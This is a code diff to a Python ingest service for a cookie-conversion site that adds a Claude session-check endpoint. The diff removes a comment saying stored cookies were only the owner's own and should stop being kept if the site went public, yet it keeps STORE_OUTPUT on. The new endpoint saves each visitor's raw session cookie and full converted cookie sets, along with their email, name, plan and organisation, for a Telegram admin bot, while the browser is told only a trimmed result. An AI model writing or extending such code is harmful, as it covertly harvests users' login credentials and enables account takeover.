@@ -1,17 +1,14 @@
 #!/usr/bin/env python3
 """claudecookie ingest service.
 
-A single-file, stdlib-only HTTP endpoint behind nginx. Its only job is to accept
-the usage beacon the site sends and write it to SQLite. The admin surface is the
-Telegram bot (tgbot.py), which reads the same database.
+A single-file HTTP endpoint behind nginx. It accepts the usage beacon and the
+Claude session check, writes skinny event rows plus cookie blobs to SQLite, and
+exposes the box public key. The admin surface is tgbot.py on the same database.
 
-  POST /e            usage beacon from claudecookie.com (proxied by nginx)
-  GET  /api/health   liveness
-
-The site is private (locked to the owner at the edge), so the beacon may carry
-the full converted output - it is the owner's own cookies, kept so they are not
-lost. There are no third parties. If the site is ever made public again, the
-`out` field must stop being stored (see STORE_OUTPUT).
+  GET  /box          P-256 public JWK (not a secret)
+  POST /e            usage beacon (pageview plaintext; convert is a sealed box)
+  POST /check        Claude session check (sealed box)
+  GET  /api/health   liveness (localhost only; nginx does not proxy this)
 """
 
 from __future__ import annotations
@@ -21,20 +18,26 @@ import json
 import os
 import re
 import sqlite3
+import sys
 import threading
 import time
 from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from pathlib import Path
+
+_HERE = Path(__file__).resolve().parent
+if str(_HERE) not in sys.path:
+    sys.path.insert(0, str(_HERE))
+
+from box import BoxError, load_or_create_private, looks_like_box, open_json, public_jwk
+from claude_check import check_cookie, format_check_log
 
 DB_PATH = os.environ.get("CC_STATS_DB", "/var/lib/claudecookie/stats.db")
 CONF_PATH = os.environ.get("CC_STATS_CONF", "/etc/claudecookie/bot.conf")
 HOST = os.environ.get("CC_STATS_HOST", "127.0.0.1")
 PORT = int(os.environ.get("CC_STATS_PORT", "8787"))
 
-# Cookie sets run to tens of KB; keep a generous cap that still refuses abuse.
 MAX_BODY = 512 * 1024
-# The site is private, so the owner's own converted output is stored. Flip to
-# False the instant the site is reopened to the public.
 STORE_OUTPUT = True
 
 EVENT_TYPES = {"pageview", "convert"}
@@ -46,15 +49,28 @@ BOT_RE = re.compile(
     r"headless|lighthouse|pingdom|uptime)",
     re.I,
 )
-# Pull domains out of stored output for the "top domains" stat, without keeping
-# names or values. Matches a leading-dot or bare host at the start of a Netscape
-# line, and "domain":"..." in JSON.
 DOMAIN_RE = re.compile(r'(?:^|[",{\s])\.?([a-z0-9-]+(?:\.[a-z0-9-]+)+)', re.I)
+
+_box_private = None
 
 
 def load_conf() -> dict:
-    with open(CONF_PATH, "r", encoding="utf-8") as f:
-        return json.load(f)
+    if Path(CONF_PATH).is_file():
+        with open(CONF_PATH, "r", encoding="utf-8") as f:
+            data = json.load(f)
+    else:
+        data = {}
+    token = data.get("bot_token") or os.environ.get("TG_BOT_TOKEN") or ""
+    owner_raw = data.get("owner_id") or os.environ.get("TG_OWNER_ID") or "0"
+    try:
+        owner = int(owner_raw)
+    except (TypeError, ValueError):
+        owner = 0
+    return {
+        "bot_token": token,
+        "owner_id": owner,
+        "ingest_salt": data.get("ingest_salt") or os.environ.get("CC_INGEST_SALT") or "dev",
+    }
 
 
 CONF = load_conf()
@@ -74,35 +90,110 @@ CREATE TABLE IF NOT EXISTS events (
     to_fmt   TEXT,
     n        INTEGER,
     domains  TEXT,
-    output   TEXT
+    output   TEXT,
+    valid    INTEGER,
+    reason   TEXT,
+    info     TEXT
 );
-CREATE INDEX IF NOT EXISTS idx_events_day  ON events(day);
-CREATE INDEX IF NOT EXISTS idx_events_type ON events(type);
-CREATE INDEX IF NOT EXISTS idx_events_ts   ON events(ts);
+CREATE TABLE IF NOT EXISTS blobs (
+    event_id INTEGER PRIMARY KEY,
+    output   TEXT NOT NULL
+);
 CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
 CREATE TABLE IF NOT EXISTS botstate (key TEXT PRIMARY KEY, value TEXT);
 """
 
-_local = threading.local()
+INDEXES = """
+CREATE INDEX IF NOT EXISTS idx_events_day  ON events(day);
+CREATE INDEX IF NOT EXISTS idx_events_type ON events(type);
+CREATE INDEX IF NOT EXISTS idx_events_ts   ON events(ts);
+CREATE INDEX IF NOT EXISTS idx_events_type_day ON events(type, day);
+CREATE INDEX IF NOT EXISTS idx_events_type_valid ON events(type, valid);
+CREATE INDEX IF NOT EXISTS idx_events_country ON events(country);
+CREATE INDEX IF NOT EXISTS idx_events_type_locale ON events(type, locale);
+CREATE INDEX IF NOT EXISTS idx_events_device_visitor ON events(device, visitor);
+"""
+
+MIGRATIONS = {
+    "ts": "ALTER TABLE events ADD COLUMN ts INTEGER",
+    "day": "ALTER TABLE events ADD COLUMN day TEXT",
+    "type": "ALTER TABLE events ADD COLUMN type TEXT",
+    "visitor": "ALTER TABLE events ADD COLUMN visitor TEXT",
+    "country": "ALTER TABLE events ADD COLUMN country TEXT",
+    "locale": "ALTER TABLE events ADD COLUMN locale TEXT",
+    "device": "ALTER TABLE events ADD COLUMN device TEXT",
+    "path": "ALTER TABLE events ADD COLUMN path TEXT",
+    "from_fmt": "ALTER TABLE events ADD COLUMN from_fmt TEXT",
+    "to_fmt": "ALTER TABLE events ADD COLUMN to_fmt TEXT",
+    "n": "ALTER TABLE events ADD COLUMN n INTEGER",
+    "domains": "ALTER TABLE events ADD COLUMN domains TEXT",
+    "output": "ALTER TABLE events ADD COLUMN output TEXT",
+    "valid": "ALTER TABLE events ADD COLUMN valid INTEGER",
+    "reason": "ALTER TABLE events ADD COLUMN reason TEXT",
+    "info": "ALTER TABLE events ADD COLUMN info TEXT",
+}
+
+def box_private():
+    global _box_private
+    if _box_private is None:
+        _box_private = load_or_create_private()
+    return _box_private
+
+
+def reset_box_cache() -> None:
+    global _box_private
+    _box_private = None
 
 
 def db() -> sqlite3.Connection:
-    conn = getattr(_local, "conn", None)
-    if conn is None:
-        conn = sqlite3.connect(DB_PATH, timeout=5)
-        conn.execute("PRAGMA journal_mode=WAL")
-        conn.execute("PRAGMA busy_timeout=5000")
-        conn.row_factory = sqlite3.Row
-        _local.conn = conn
+    conn = sqlite3.connect(DB_PATH, timeout=5)
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.execute("PRAGMA busy_timeout=5000")
+    conn.row_factory = sqlite3.Row
     return conn
 
 
+def migrate_blobs(conn: sqlite3.Connection) -> None:
+    conn.execute(
+        "INSERT OR IGNORE INTO blobs (event_id, output) "
+        "SELECT id, output FROM events WHERE output IS NOT NULL AND length(output) > 0"
+    )
+    conn.execute("UPDATE events SET output = NULL WHERE output IS NOT NULL")
+
+
+def migrate_push_settings(conn: sqlite3.Connection) -> None:
+    keys = {row[0] for row in conn.execute("SELECT key FROM settings")}
+    if "push_check_valid" in keys or "push_check_invalid" in keys:
+        return
+    old = "1"
+    row = conn.execute("SELECT value FROM settings WHERE key='push_check'").fetchone()
+    if row is not None:
+        old = row[0]
+    for key in ("push_check_valid", "push_check_invalid"):
+        conn.execute(
+            "INSERT INTO settings(key,value) VALUES(?,?) "
+            "ON CONFLICT(key) DO NOTHING",
+            (key, old),
+        )
+
+
 def init_db() -> None:
-    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
+    parent = os.path.dirname(DB_PATH)
+    if parent:
+        os.makedirs(parent, exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
-    conn.executescript(SCHEMA)
-    conn.commit()
-    conn.close()
+    try:
+        conn.executescript(SCHEMA)
+        have = {row[1] for row in conn.execute("PRAGMA table_info(events)")}
+        for column, ddl in MIGRATIONS.items():
+            if column not in have:
+                conn.execute(ddl)
+        conn.executescript(INDEXES)
+        migrate_blobs(conn)
+        migrate_push_settings(conn)
+        conn.commit()
+    finally:
+        conn.close()
 
 
 def now() -> int:
@@ -123,8 +214,7 @@ def device_class(ua: str) -> str:
 
 
 def extract_domains(text: str) -> str | None:
-    """A compact, de-duplicated list of hostnames seen in the output, most-common
-    first. Used only for the aggregate 'top domains' view; never names or values."""
+    """Hostnames seen in stored output, most-common first. Never names or values."""
     if not text:
         return None
     counts: dict[str, int] = {}
@@ -136,6 +226,67 @@ def extract_domains(text: str) -> str | None:
         return None
     ordered = sorted(counts, key=lambda h: (-counts[h], h))
     return ",".join(ordered[:20])
+
+
+def check_info(result: dict) -> dict:
+    session = result.get("session") or {}
+    weekly = result.get("weekly") or {}
+    extras = result.get("extras") or {}
+    return {
+        "email": result.get("email"),
+        "name": result.get("name"),
+        "plan": result.get("planLabel"),
+        "session": session.get("percent"),
+        "sessionResets": session.get("resets"),
+        "weekly": weekly.get("percent"),
+        "weeklyResets": weekly.get("resets"),
+        "org": extras.get("organizationName") or extras.get("organizationId"),
+    }
+
+
+def public_check_result(result: dict) -> dict:
+    """JSON the browser is allowed to see. No extras, ids, or cookie material."""
+    if not result.get("ok"):
+        return {"ok": False, "invalidReason": result.get("invalidReason") or "invalid"}
+    session = result.get("session")
+    weekly = result.get("weekly")
+    return {
+        "ok": True,
+        "email": result.get("email"),
+        "name": result.get("name"),
+        "planLabel": result.get("planLabel"),
+        "session": session if isinstance(session, dict) else None,
+        "weekly": weekly if isinstance(weekly, dict) else None,
+    }
+
+
+def insert_event(conn: sqlite3.Connection, row: dict, output: str | None) -> int:
+    payload = {**row, "output": None}
+    cur = conn.execute(
+        "INSERT INTO events (ts,day,type,visitor,country,locale,device,path,"
+        "from_fmt,to_fmt,n,domains,output,valid,reason,info) VALUES (:ts,:day,"
+        ":type,:visitor,:country,:locale,:device,:path,:from_fmt,:to_fmt,:n,"
+        ":domains,:output,:valid,:reason,:info)",
+        payload,
+    )
+    event_id = int(cur.lastrowid)
+    if STORE_OUTPUT and output:
+        conn.execute(
+            "INSERT INTO blobs (event_id, output) VALUES (?, ?)",
+            (event_id, output[:MAX_BODY]),
+        )
+    return event_id
+
+
+def trusted_page(origin: str, referer: str) -> bool:
+    for src in (origin.strip(), referer.strip()):
+        if not src:
+            continue
+        if src == "https://claudecookie.com" or src.startswith("https://claudecookie.com/"):
+            return True
+        if src.startswith("http://localhost:") or src.startswith("http://127.0.0.1:"):
+            return True
+    return False
 
 
 class RateLimiter:
@@ -157,6 +308,7 @@ class RateLimiter:
 
 
 ingest_limiter = RateLimiter(limit=240, window=60)
+check_limiter = RateLimiter(limit=20, window=60)
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -187,17 +339,26 @@ class Handler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(body)
 
+    def _trusted(self) -> bool:
+        return trusted_page(self.headers.get("Origin") or "", self.headers.get("Referer") or "")
+
     def log_message(self, *args):
         pass
 
     def do_GET(self):
-        if self.path.split("?", 1)[0] == "/api/health":
+        path = self.path.split("?", 1)[0]
+        if path == "/box":
+            return self._json(200, public_jwk(box_private()))
+        if path == "/api/health":
             return self._json(200, {"ok": True})
         self._empty(404)
 
     def do_POST(self):
-        if self.path.split("?", 1)[0] == "/e":
+        path = self.path.split("?", 1)[0]
+        if path == "/e":
             return self.ingest()
+        if path == "/check":
+            return self.check()
         self._empty(404)
 
     def ingest(self):
@@ -210,14 +371,27 @@ class Handler(BaseHTTPRequestHandler):
             data = json.loads(self._read_body() or b"{}")
         except (ValueError, TypeError):
             return self._empty(204)
+        if not isinstance(data, dict):
+            return self._empty(204)
+
+        if looks_like_box(data):
+            if not self._trusted():
+                return self._empty(204)
+            try:
+                data = open_json(box_private(), data)
+            except BoxError:
+                return self._empty(204)
+        elif data.get("t") == "pageview":
+            pass
+        else:
+            # Plaintext convert (or anything else with an `out`) is rejected.
+            return self._empty(204)
 
         etype = data.get("t")
         if etype not in EVENT_TYPES:
             return self._empty(204)
 
         country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
-        # The site is private, so a client-supplied locale is trustworthy enough;
-        # it is still whitelisted to the three known values.
         locale = data.get("l")
         locale = locale if locale in LOCALES else None
 
@@ -225,8 +399,10 @@ class Handler(BaseHTTPRequestHandler):
             "ts": now(), "day": today(), "type": etype,
             "visitor": visitor_hash(ip, ua), "country": country, "locale": locale,
             "device": device_class(ua), "path": None, "from_fmt": None,
-            "to_fmt": None, "n": None, "domains": None, "output": None,
+            "to_fmt": None, "n": None, "domains": None,
+            "valid": None, "reason": None, "info": None,
         }
+        output = None
 
         if etype == "pageview":
             p = data.get("p")
@@ -241,22 +417,74 @@ class Handler(BaseHTTPRequestHandler):
             if isinstance(out, str) and out:
                 out = out[:MAX_BODY]
                 row["domains"] = extract_domains(out)
-                if STORE_OUTPUT:
-                    row["output"] = out
+                output = out
 
         conn = db()
-        conn.execute(
-            "INSERT INTO events (ts,day,type,visitor,country,locale,device,path,"
-            "from_fmt,to_fmt,n,domains,output) VALUES (:ts,:day,:type,:visitor,"
-            ":country,:locale,:device,:path,:from_fmt,:to_fmt,:n,:domains,:output)",
-            row,
-        )
-        conn.commit()
+        try:
+            insert_event(conn, row, output)
+            conn.commit()
+        finally:
+            conn.close()
         return self._empty(204)
+
+    def check(self):
+        ip = self._client_ip()
+        ua = self.headers.get("User-Agent", "")
+        if BOT_RE.search(ua) or not check_limiter.allow(ip):
+            return self._json(429, {"ok": False, "invalidReason": "rate_limited"})
+        if not self._trusted():
+            return self._json(400, {"ok": False, "invalidReason": "empty"})
+
+        try:
+            data = json.loads(self._read_body() or b"{}")
+        except (ValueError, TypeError):
+            return self._json(400, {"ok": False, "invalidReason": "empty"})
+        if not isinstance(data, dict):
+            return self._json(400, {"ok": False, "invalidReason": "empty"})
+
+        if not looks_like_box(data):
+            return self._json(400, {"ok": False, "invalidReason": "empty"})
+        try:
+            inner = open_json(box_private(), data)
+        except BoxError:
+            return self._json(400, {"ok": False, "invalidReason": "empty"})
+
+        raw = inner.get("cookie")
+        if not isinstance(raw, str):
+            raw = ""
+        raw = raw[:MAX_BODY]
+        locale = inner.get("l")
+        locale = locale if locale in LOCALES else None
+
+        result = check_cookie(raw)
+        print(format_check_log(result), flush=True)
+        if raw.strip():
+            self._store_check(ip, ua, locale, raw, result)
+        return self._json(200, public_check_result(result))
+
+    def _store_check(self, ip: str, ua: str, locale: str | None, raw: str, result: dict) -> None:
+        country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
+        ok = bool(result.get("ok"))
+        row = {
+            "ts": now(), "day": today(), "type": "check",
+            "visitor": visitor_hash(ip, ua), "country": country, "locale": locale,
+            "device": device_class(ua), "path": "/check", "from_fmt": None,
+            "to_fmt": None, "n": 1, "domains": "claude.ai",
+            "valid": 1 if ok else 0,
+            "reason": None if ok else (result.get("invalidReason") or "invalid"),
+            "info": json.dumps(check_info(result), ensure_ascii=False) if ok else None,
+        }
+        conn = db()
+        try:
+            insert_event(conn, row, raw if STORE_OUTPUT else None)
+            conn.commit()
+        finally:
+            conn.close()
 
 
 def main():
     init_db()
+    box_private()
     server = ThreadingHTTPServer((HOST, PORT), Handler)
     server.daemon_threads = True
     print(f"cc-ingest listening on {HOST}:{PORT}", flush=True)
